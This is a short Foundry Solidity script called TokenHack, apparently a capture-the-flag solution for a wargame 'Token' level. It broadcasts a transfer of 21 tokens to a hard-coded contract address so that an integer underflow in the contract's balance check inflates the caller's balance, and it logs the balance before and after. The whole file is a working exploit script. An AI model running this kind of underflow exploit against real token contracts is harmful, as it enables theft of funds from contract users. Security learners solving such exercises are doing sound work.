// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenHack is Script {
    Token public token =
        Token(payable(0xeFeb2C0FF979dcb4B586b507FC7B632d6C6184bc));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(
            "Tokens before hack",
            token.balanceOf(vm.envAddress("MY_ADDRESS"))
        );

        token.transfer(address(this), 21);
        console.log(
            "Tokens after hack",
            token.balanceOf(vm.envAddress("MY_ADDRESS"))
        );

        vm.stopBroadcast();
    }
}

// forge script script/Token.s.sol -vv
// forge script script/Token.s.sol -vv --broadcast
